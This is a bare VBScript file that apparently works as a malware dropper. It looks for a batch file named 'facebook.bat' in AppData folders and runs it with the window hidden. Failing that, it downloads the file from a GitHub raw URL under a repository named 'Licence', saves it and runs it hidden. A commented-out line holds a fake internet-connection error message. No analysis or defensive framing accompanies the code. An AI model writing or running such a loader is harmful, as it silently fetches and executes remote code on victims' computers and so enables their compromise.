Dim FSO
Set WshShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")


User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Loc1 = "C:\Users\"+ User + "\AppData\Roaming\facebook.bat"
Loc2 = "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat"
Loc3 = ".\facebook.bat"
Currnt = "C:\Users\"+ User + "\AppData\Roaming"

If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Roaming\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Else
   'MsgBox "[✔] Please check your internet connection and try again!"
    	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

	URL = "https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true"
	objWinHttp.open "GET", URL, False
	objWinHttp.send ""

	SaveBinaryData ".\facebook.bat",objWinHttp.responseBody
	Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	End Function
   WScript.Sleep 1000
   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing

End If








